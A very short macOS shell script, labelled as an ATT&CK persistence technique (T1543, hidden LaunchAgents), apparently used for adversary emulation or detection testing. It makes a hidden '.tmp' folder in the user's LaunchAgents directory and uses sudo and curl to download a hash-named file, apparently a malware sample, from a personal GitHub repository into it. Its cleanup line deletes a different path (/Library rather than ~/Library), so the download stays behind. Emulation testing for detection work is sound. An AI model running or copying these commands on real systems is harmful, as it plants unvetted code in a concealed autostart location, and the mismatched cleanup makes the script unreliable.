
#ATTACK_PERSISTENCE_T1543_MACOS_HIDDEN_LAUNCHAGENTS_LAUNCHDAEMONS


sudo mkdir ~/Library/LaunchAgents/.tmp

sudo curl https://raw.githubusercontent.com/Pratik-987/Macos/main/e817ff91d8288c26c52766c924fba5936fb61a5e2cc08b63cf46ad55bf20e5d1 -o ~/Library/LaunchAgents/.tmp/e817ff91d8288c26c52766c924fba5936fb61a5e2cc08b63cf46ad55bf20e5d1

sudo rm -rf -R /Library/LaunchAgents/.tmp